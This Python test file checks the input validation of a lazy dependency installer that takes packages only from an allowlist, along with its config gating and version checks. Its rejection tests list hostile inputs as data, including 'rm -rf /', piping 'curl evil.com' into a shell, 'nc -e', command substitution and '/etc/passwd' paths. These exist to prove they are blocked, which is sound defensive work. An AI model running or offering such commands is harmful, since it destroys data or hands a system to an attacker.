"""Tests for tools.lazy_deps — the supply-chain-resilient on-demand installer.

The lazy_deps module is the architectural fix for the "one quarantined
package nukes 10 unrelated extras" problem. It exposes ``ensure(feature)``
which only installs from a strict allowlist, refuses anything that looks
like a URL / file path, runs venv-scoped, and respects the
``security.allow_lazy_installs`` config flag.

These tests cover the security boundary and the public API. The real pip
call is mocked — we never actually shell out during unit tests.
"""

from __future__ import annotations


import pytest

import tools.lazy_deps as ld




class TestSpecSafety:
    @pytest.mark.parametrize("spec", [
        "mistralai>=2.3.0,<3",
        "elevenlabs>=1.0,<2",
        "honcho-ai>=2.2.0,<3",
        "boto3>=1.35.0,<2",
        "mautrix[encryption]>=0.20,<1",
        "google-api-python-client>=2.100,<3",
        "youtube-transcript-api>=1.2.0",
        "qrcode>=7.0,<8",
        "package",
        "package==1.0.0",
        "package~=1.0",
    ])
    def test_safe_specs_pass(self, spec):
        assert ld._spec_is_safe(spec), f"expected {spec!r} to be safe"

    @pytest.mark.parametrize("spec", [
        "git+https://github.com/foo/bar.git",
        "https://example.com/foo.tar.gz",
        "/etc/passwd",
        "./local-malware",
        "../escape",
        "package; rm -rf /",
        "package && curl evil.com | sh",
        "package`whoami`",
        "package$(whoami)",
        "package|nc -e",
        "--index-url=http://evil/",
        "-r requirements.txt",
        "package\nshell-injection",
        "package\rmore",
        "",
        "x" * 500,
    ])
    def test_unsafe_specs_rejected(self, spec):
        assert not ld._spec_is_safe(spec), \
            f"expected {spec!r} to be rejected"




class TestAllowlist:
    def test_unknown_feature_raises(self, monkeypatch):
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        with pytest.raises(ld.FeatureUnavailable, match="not in LAZY_DEPS"):
            ld.ensure("not.a.real.feature")


    def test_feature_install_command_unknown(self):
        assert ld.feature_install_command("not.real") is None
        assert ld.feature_install_command("not.real", venv_pip=True) is None

    def test_feature_install_command_venv_pip_targets_interpreter(self):
        import sys as _sys
        default = ld.feature_install_command("platform.teams")
        venv = ld.feature_install_command("platform.teams", venv_pip=True)
        assert default is not None and venv is not None
        assert venv.startswith(f"{_sys.executable} -m pip install ")
        assert default.startswith("uv pip install ")
        assert venv.split(" -m pip install ", 1)[1] == default.split("uv pip install ", 1)[1]




class TestSecurityGating:
    def test_disabled_via_config_raises(self, monkeypatch):
        monkeypatch.setitem(ld.LAZY_DEPS, "test.feat", ("packageX>=1.0,<2",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: False)
        with pytest.raises(ld.FeatureUnavailable, match="lazy installs disabled"):
            ld.ensure("test.feat", prompt=False)


    def test_config_failure_fails_open(self, monkeypatch):
        monkeypatch.delenv("DAEDALUS_DISABLE_LAZY_INSTALLS", raising=False)
        monkeypatch.setattr(
            "daedalus_cli.config.load_config",
            lambda: (_ for _ in ()).throw(RuntimeError("config broken")),
        )
        assert ld._allow_lazy_installs() is True




class TestEnsure:
    def test_already_satisfied_is_noop(self, monkeypatch):
        monkeypatch.setitem(ld.LAZY_DEPS, "test.satisfied", ("zzzfake>=1",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: True)
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called"),
        )
        ld.ensure("test.satisfied", prompt=False)


    def test_install_succeeds_but_still_missing_raises(self, monkeypatch):
        monkeypatch.setitem(ld.LAZY_DEPS, "test.cache", ("zzzfake>=1",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda specs, **kw: ld._InstallResult(True, "ok", ""),
        )
        with pytest.raises(ld.FeatureUnavailable, match="still not importable"):
            ld.ensure("test.cache", prompt=False)




class TestIsAvailable:
    def test_unknown_feature_returns_false(self):
        assert ld.is_available("not.a.thing") is False


    def test_missing_returns_false(self, monkeypatch):
        monkeypatch.setitem(ld.LAZY_DEPS, "test.miss", ("zzzfake>=1",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        assert ld.is_available("test.miss") is False




class TestIsSatisfiedVersionAware:
    def _fake_version(self, monkeypatch, installed_versions: dict):
        """Patch importlib.metadata.version() inside lazy_deps."""
        from importlib.metadata import PackageNotFoundError

        def _version(pkg):
            if pkg in installed_versions:
                return installed_versions[pkg]
            raise PackageNotFoundError(pkg)

        import importlib.metadata as _md
        monkeypatch.setattr(_md, "version", _version)

    def test_exact_pin_match_returns_true(self, monkeypatch):
        self._fake_version(monkeypatch, {"honcho-ai": "2.2.0"})
        assert ld._is_satisfied("honcho-ai==2.2.0") is True


    def test_range_within_returns_true(self, monkeypatch):
        self._fake_version(monkeypatch, {"slack-bolt": "1.27.0"})
        assert ld._is_satisfied("slack-bolt>=1.18.0,<2") is True


    def test_bare_package_name_presence_is_enough(self, monkeypatch):
        self._fake_version(monkeypatch, {"somepkg": "1.0.0"})
        assert ld._is_satisfied("somepkg") is True

    def test_extras_block_in_spec_is_stripped(self, monkeypatch):
        self._fake_version(monkeypatch, {"mautrix": "0.21.0"})
        assert ld._is_satisfied("mautrix[encryption]==0.21.0") is True

    def test_extras_block_mismatch_returns_false(self, monkeypatch):
        self._fake_version(monkeypatch, {"mautrix": "0.20.0"})
        assert ld._is_satisfied("mautrix[encryption]==0.21.0") is False

    def test_trace_upload_hub_at_core_locked_version_is_current(self, monkeypatch):
        """#60783 regression: refresh must not churn the shared hub install.

        huggingface-hub arrives in the venv via the core lock (transformers /
        sentence-transformers for local Hindsight, faster-whisper, tokenizers).
        With the LAZY_DEPS pin held in lockstep with uv.lock, the version the
        core installs satisfies the trace-upload spec, so the `daedalus update`
        lazy-refresh pass reports "current" instead of reinstalling — the
        downgrade that used to break the Hindsight daemon can't happen.
        """
        spec = ld.LAZY_DEPS["tool.trace_upload"][0]
        pinned = ld._specifier_from_spec(spec).lstrip("=")
        self._fake_version(monkeypatch, {"huggingface-hub": pinned})
        assert ld._is_satisfied(spec) is True
        assert ld.feature_missing("tool.trace_upload") == ()

    @pytest.mark.parametrize(
        ("feature", "installed_versions", "expected_repairs"),
        [
            (
                "skill.google_workspace",
                {
                    "google-api-python-client": "2.194.0",
                    "google-auth": "2.55.0",
                    "google-auth-oauthlib": "1.3.1",
                    "google-auth-httplib2": "0.3.1",
                    "httplib2": "0.31.2",
                    "pyasn1": "0.6.3",
                },
                (
                    "google-auth==2.55.1",
                    "httplib2==0.32.0",
                    "pyasn1==0.6.4",
                ),
            ),
            (
                "provider.vertex",
                {
                    "google-auth": "2.55.1",
                    "pyasn1": "0.6.3",
                },
                ("pyasn1==0.6.4",),
            ),
        ],
    )
    def test_google_features_repair_stale_transitives(
        self,
        monkeypatch,
        feature,
        installed_versions,
        expected_repairs,
    ):
        self._fake_version(monkeypatch, installed_versions)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        installed = []

        def fake_install(specs, **kwargs):
            installed.extend(specs)
            for spec in specs:
                package, wanted = spec.split("==", 1)
                installed_versions[package] = wanted
            return ld._InstallResult(True, "ok", "")

        monkeypatch.setattr(ld, "_venv_pip_install", fake_install)

        ld.ensure(feature, prompt=False)

        assert tuple(installed) == expected_repairs




class TestActiveFeatures:
    def test_no_packages_installed_returns_empty(self, monkeypatch):
        monkeypatch.setattr(ld, "_is_present", lambda spec: False)
        assert ld.active_features() == []


    def test_shared_dependency_does_not_activate_feature(self, monkeypatch):
        monkeypatch.setattr(
            ld, "_is_present",
            lambda spec: ld._pkg_name_from_spec(spec) == "asyncpg",
        )
        assert "platform.matrix" not in ld.active_features()


class TestRefreshActiveFeatures:
    def test_no_active_features_returns_empty(self, monkeypatch):
        monkeypatch.setattr(ld, "active_features", lambda: [])
        assert ld.refresh_active_features() == {}

    def test_windows_matrix_refresh_is_skipped_before_pip(self, monkeypatch):
        monkeypatch.setattr(
            ld,
            "_unsupported_feature_reason",
            lambda feature: (
                "unsupported on Windows: Matrix E2EE depends on python-olm"
                if feature == "platform.matrix"
                else None
            ),
        )
        monkeypatch.setattr(ld, "active_features", lambda: ["platform.matrix"])
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld,
            "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called for unsupported Matrix on Windows"),
        )

        result = ld.refresh_active_features()

        assert result["platform.matrix"].startswith("skipped:")
        assert "unsupported on Windows" in result["platform.matrix"]

    @pytest.mark.windows_only
    def test_matrix_probe_reports_unsupported_on_real_windows(self):
        assert "unsupported on Windows" in (
            ld._unsupported_feature_reason("platform.matrix") or ""
        )


    def test_mixed_results_returns_per_feature_status(self, monkeypatch):
        monkeypatch.setattr(ld, "active_features", lambda: ["a.ok", "b.fail"])
        monkeypatch.setitem(ld.LAZY_DEPS, "a.ok", ("pkga==1.0",))
        monkeypatch.setitem(ld.LAZY_DEPS, "b.fail", ("pkgb==1.0",))
        def fake_satisfied(spec):
            return ld._pkg_name_from_spec(spec) == "pkga"
        monkeypatch.setattr(ld, "_is_satisfied", fake_satisfied)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda specs, **kw: ld._InstallResult(False, "", "nope"),
        )
        result = ld.refresh_active_features()
        assert result["a.ok"] == "current"
        assert result["b.fail"].startswith("failed:")




class TestInstallSpecs:
    def test_empty_specs_is_trivially_ok(self, monkeypatch):
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called"),
        )
        result = ld.install_specs([])
        assert result.ok is True
        assert result.blocked is False

    def test_blank_specs_are_ignored(self, monkeypatch):
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called"),
        )
        result = ld.install_specs(["", "   "])
        assert result.ok is True

    @pytest.mark.parametrize("bad", [
        "pkg; rm -rf /",
        "-e git+https://evil.example/repo.git",
        "https://evil.example/pkg.tar.gz",
        "../../etc/passwd",
        "pkg @ file:///tmp/x",
    ])
    def test_unsafe_specs_are_blocked_before_any_install(self, monkeypatch, bad):
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called"),
        )
        result = ld.install_specs([bad])
        assert result.ok is False
        assert result.blocked is True
        assert "unsafe spec" in result.reason

    def test_one_unsafe_spec_blocks_the_whole_batch(self, monkeypatch):
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called"),
        )
        result = ld.install_specs(["honcho-ai==2.2.0", "pkg; rm -rf /"])
        assert result.blocked is True


    def test_never_raises_on_unexpected_error(self, monkeypatch):
        monkeypatch.delenv("DAEDALUS_DISABLE_LAZY_INSTALLS", raising=False)
        monkeypatch.delenv(ld._LAZY_TARGET_ENV, raising=False)
        monkeypatch.setattr(
            "daedalus_cli.config.load_config", lambda: {}, raising=False
        )
        def boom(specs, **kw):
            raise RuntimeError("disk on fire")
        monkeypatch.setattr(ld, "_venv_pip_install", boom)
        result = ld.install_specs(["honcho-ai==2.2.0"])
        assert result.ok is False
        assert "disk on fire" in result.stderr
